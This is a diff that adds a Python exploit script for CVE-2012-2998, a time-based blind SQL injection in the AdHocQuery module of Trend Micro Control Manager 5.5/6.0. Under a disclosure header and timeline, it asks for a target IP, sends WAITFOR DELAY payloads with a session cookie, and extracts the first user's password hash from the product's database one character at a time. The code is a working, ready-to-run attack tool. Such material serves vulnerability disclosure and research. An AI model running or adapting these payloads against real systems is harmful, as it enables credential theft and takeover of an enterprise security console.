@@ -1,0 +1,102 @@
+#!/usr/bin/env python
+
+# Exploit Title: Trend Micro Control Manager 5.5/6.0 AdHocQuery BlindSQL Injection (post-auth)
+# Disclosure Date: 09/27/2012
+# Author: otoy (@otoy_rood) & modpr0be (@modpr0be)
+# Contact: research[at]spentera.com
+# Platform: Windows
+# Tested on: Windows 2003 Standard Edition
+# Software Link: http://www.trendmicro.com/ftp/products/tmcm/CM6_Package.zip
+# References: http://www.spentera.com/2012/09/trend-micro-control-manager-sql-injection-and-xss-vulnerability/
+# CVE-ID: CVE-2012-2998
+
+### Software Description
+# Trend Micro Control Manager is a centralized security management for the enterprise.
+# The web-based management console tracks security performance, reports malware events and 
+# policy violations, and automates routine tasks. New features include a customizable dashboard 
+# and at-a-glance access to threat statistics from the Trend Micro Smart Protection Network, 
+# Trend Micro's cloud-based security infrastructure.
+
+### Vulnerability Details
+# Vulnerability found in AdHocQuery module inside the id parameter. By injecting payload after the 
+# id parameter, let say ' WAITFOR DELAY '0:0:5'-- the web application hung for 5 seconds, 
+# which gives us a conclusion that the web application is vulnerable to time-based sql injection.
+
+# The script below is just a proof of concept, you must get a cookie. This vulnerability will need some 
+# attack vectors to be exploited, but it is still a vulnerability.
+# Remember to set the cookie first.
+
+### Disclosure Timeline
+# 07/23/2012 - Bug found
+# 07/25/2012 - Reported to CERT/CC
+# 07/26/2012 - Reported to JPCERT/CC
+# 08/14/2012 - Vendor received the vulnerability
+# 09/20/2012 - Vendor acknowledged the vulnerability
+# 09/27/2012 - Public advisory released
+
+
+import sys,time,urllib,urllib2
+
+print """
+#===============================================================#
+|                                                               |
+|            ___|                   |                           |
+|          \___ \  __ \   _ \ __ \  __|  _ \  __| _` |          |
+|                | |   |  __/ |   | |    __/ |   (   |          |
+|          _____/  .__/ \___|_|  _|\__|\___|_|  \__,_|          |
+|                 _|                                            |
+|                                                               |
+|    Trend Micro Control Manager BlindSQLi Password Extractor   |
+|                         CVE-2012-2998				|
+|          by otoy & modpr0be (research[at]spentera.com)	|
+|                                                               |
+#===============================================================#
+"""
+host = raw_input("[+] Target IP: ")
+target = 'https://%s/webapp/AdHocQuery/AdHocQuery_Processor.aspx' %(host)
+#SQLi delay, for remote target increase the delay time (default: 2 seconds)
+delay=2
+
+cookie = ("ASP_NET_SessionId=pazibiigfom13ijbaaqxxx55; .ASPXAUTH=582E40E7A78D452B18EF6719DE422CE121E3E7793E2FB661679753C1DCA50D9F7873CFF37BAF54AB3CCD84F5899D930A5D190F2C99552739F1C19FAF80F3EEE444951D0C9B7F6FD707E83BFC02ABD21D; WFINFOR=test")
+
+def Hex2Des(item):
+       	return ord(hex(item).replace('0x',''))
+
+def konek(m,n):
+	#borrow from SQLmap :)
+	query=("' IF(UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(Password AS NVARCHAR(4000)),CHAR(32))) FROM db_ControlManager.dbo.tb_UserInfo"
+	       " WHERE CONVERT(NVARCHAR(4000),Password)>CHAR(32)),%s,1)) > %s) WAITFOR DELAY '0:0:%s'--" %(m,n,delay))
+
+	values = { 'Action': 'View',             
+        	   'id': '350b651c-15c5-45ca-8d64-33b20f3fc4d8'+query,
+        	   'asc': 'true',
+        	   'Sort': 7,
+	           'paging': 10 }
+ 
+	url = "%s?%s" % (target, urllib.urlencode(values)) 
+	req = urllib2.Request(url)                         
+	req.add_header('Cookie', cookie)                  
+	try:                                        
+    		starttime=time.time()
+    		response = urllib2.urlopen(req)     
+    		endtime = time.time()
+    		return int(endtime-starttime)
+	except:                                             
+    		print '\n[-] Uh oh! Exploit fail..'                
+    		sys.exit(0)
+
+print "[+] Using Time-Based method with %ds delay."%int(delay)
+print "[+] Starting to extract hash from the first user."
+sys.stdout.write('[+] Here is the hash : ')
+sys.stdout.flush()
+
+starttime = time.time()
+for m in range(1,33):
+	for n in range(0,16):
+		wkttunggu = konek(m,Hex2Des(n))	
+		if (wkttunggu < delay):				
+			sys.stdout.write(chr(Hex2Des(n)))
+			sys.stdout.flush()
+			break
+endtime = time.time()
+print "\n[+] Done! Hash extracted in %d seconds" %int(endtime-starttime)
